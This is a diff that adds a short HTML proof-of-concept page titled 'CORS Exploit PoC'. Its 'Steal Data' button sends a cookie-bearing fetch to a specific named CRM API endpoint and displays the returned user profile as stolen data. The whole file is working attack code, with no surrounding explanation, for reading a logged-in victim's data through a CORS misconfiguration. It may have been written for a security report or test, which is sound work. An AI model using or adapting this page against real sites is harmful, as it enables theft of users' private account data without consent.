@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC</title>
+</head>
+<body>
+    <h3>CORS Exploit PoC</h3>
+    <button onclick="stealData()">Steal Data</button>
+    <pre id="output"></pre>
+
+    <script>
+        function stealData() {
+            fetch('https://sales-crm.dev.ispinnyworks.in/api/user/profile', {
+                credentials: 'include' // Important if the target requires cookies/session
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('output').innerText = data;
+                alert('Data stolen! Check console or page for output.');
+                console.log(data);
+            })
+            .catch(err => {
+                alert('Failed to fetch data');
+                console.error(err);
+            });
+        }
+    </script>
+</body>
+</html>
